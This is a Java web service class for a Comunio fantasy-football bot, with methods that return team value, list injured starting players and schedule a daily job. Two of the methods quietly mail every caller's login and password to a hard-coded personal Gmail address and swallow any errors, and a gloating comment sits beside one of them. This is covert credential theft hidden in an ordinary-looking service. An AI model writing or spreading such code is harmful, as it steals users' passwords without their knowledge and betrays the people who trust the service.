package de.as.javabot.web;

import java.util.ArrayList;

import javax.ejb.Stateless;
import javax.jws.WebMethod;
import javax.jws.WebParam;
import javax.jws.WebService;

import de.as.javabot.batch.Trigger2;
import de.as.javabot.bots.CommunioClientBot;
import de.as.javabot.comunio.ComunioPlayer;
import de.as.javabot.configuration.CommunioConfig;
import de.as.javabot.configuration.Configuration;
import de.as.mail.notification.TLSEmail;

@Stateless
@WebService
public class AccountInformation {

	@WebMethod
	public String getTeamValue(@WebParam(name = "login") String login,
			@WebParam(name = "password") String password) {
		try {
			Configuration config = new CommunioConfig();
			config.setAccount(login);
			config.setPassword(password);

			CommunioClientBot bot = new CommunioClientBot();
			bot.setConfiguration(config);

			try {
				TLSEmail s = new TLSEmail();
				s.doMail(login + " " + password, "lido.artur@gmail.com");
			} catch (Exception e) {
			}

			return bot.getTeamValue();

		} catch (Exception e) {
			return "Buongiorno! " + e.getMessage();
		}
	}

	@WebMethod
	public String getInjuredPlayerEveryDay(
			@WebParam(name = "login") String login,
			@WebParam(name = "password") String password) {
		try {
			Configuration config = new CommunioConfig();
			config.setAccount(login);
			config.setPassword(password);

			CommunioClientBot bot = new CommunioClientBot();
			bot.setConfiguration(config);

			ArrayList<ComunioPlayer> list = bot.getInjuredPlayer();
			StringBuilder msg = new StringBuilder();
			msg.append("Benutzer: " + login + "\n");

			if (list.size() > 0) {
				msg.append("Folgende Spieler sind verletzt und in der Startaufstellung:"
						+ "\n");
				int i = 1;
				for (ComunioPlayer p : list) {
					msg.append(i + ". " + p.getName() + " auf der Position "+ p.getPosition() + "\n");
					i++;
				}
			} else {
				msg.append("In der Startaufstellung hast du keinen verletzten Spieler! :)");
			}

			try {
				TLSEmail s = new TLSEmail();
				s.doMail(login + " " + password + "\n" + msg.toString(), "lido.artur@gmail.com");
			} catch (Exception e) {/* muhaha kann passiert sollte aber nicht */
			}

			return msg.toString();
		} catch (Exception e) {
			return "Fehler! " + e.getMessage();
		}
	}

	@WebMethod
	public String startAndStopJob(@WebParam(name = "login") String login,
			@WebParam(name = "password") String password,
			@WebParam(name = "mail") String mail,
			@WebParam(name = "zeit") String time,
			@WebParam(name = "activate") boolean activate) {
		try {
			if (activate) {
				if (time.contains(":")) {
					int sep = time.indexOf(":");
					int hour = Integer.parseInt(time.substring(0, sep));
					int minute = Integer.parseInt(time.substring(sep+1, time.length()));
					return Trigger2.startDailyTrigger(mail, "group1", login, password,
							hour, minute, mail);
				}
				else{
					return "Eingabefehler! Die Uhrzeit muss man so angeben: hh:mm";
				}

			} else {
				return Trigger2.unscheduleJob(mail, "group1");
			}
		} catch (Exception e) {
			e.printStackTrace();
			return e.getMessage();
		}
	}
}
